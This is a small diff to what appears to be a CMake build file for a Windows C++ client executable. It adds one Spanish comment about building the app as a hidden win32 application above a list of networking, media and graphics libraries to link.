@@ -36,5 +36,6 @@ set(SRCS main.cpp
 
 #set_target_properties(cliente PROPERTIES LINK_FLAGS "/SUBSYSTEM:CONSOLE")
 
+#agregar win32 para hacer la app oculta 
 add_executable(cliente ${SRCS})
 target_link_libraries(cliente PRIVATE netapi32 wsock32 ws2_32 mf mfplat mfreadwrite mfuuid wmcodecdspuuid ole32 strmiids uuid winmm wtsapi32 gdi32 gdiplus shlwapi)
